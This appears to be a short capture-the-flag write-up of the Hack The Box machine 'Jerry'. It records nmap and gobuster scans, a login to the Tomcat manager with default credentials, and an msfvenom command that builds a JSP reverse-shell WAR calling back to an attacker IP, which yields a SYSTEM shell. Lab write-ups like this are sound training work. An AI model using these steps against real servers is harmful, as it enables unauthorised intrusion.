**Ping**
![[Pasted image 20240626161450.png]]

**Nmap Scans**
```
mapit 10.10.10.95
```

Nmap Default Scan
![[Pasted image 20240626161651.png]]

Nmap Script and Service Scan
![[Pasted image 20240626161735.png]]

Nmap All port Scan
![[Pasted image 20240626164834.png]]

On port 8080
![[Pasted image 20240626164858.png]]

Gobuster Scan
```
gobuster dir -u http://10.10.10.95:8080/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,html,txt,bak,aspx -s 200,204,301,302,307,403 -k --status-codes "" -o gobuster.txt
```
![[Pasted image 20240626164239.png]]

On http://10.10.10.95:8080/manager/
![[Pasted image 20240626164955.png]]
It will prompt for password, found default creds for tomcat server **tomcat:s3cr3t**

In hacktricks page about tomcat enumeration: https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat
![[Pasted image 20240626165311.png]]

WAR file upload filed
![[Pasted image 20240626165330.png]]

Will generate a war file
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.9 LPORT=443 -f war -o shell.war
```
![[Pasted image 20240626165538.png]]

Will upload and deploy it
![[Pasted image 20240626165809.png]]
We can see the shell file, will just click it before that set up a Netcat listener

Got reverse shell
![[Pasted image 20240626165912.png]]
We are nt authority, so no need Privilege Escalation

**Flags**
![[Pasted image 20240626170445.png]]




Done with Jerry....:)

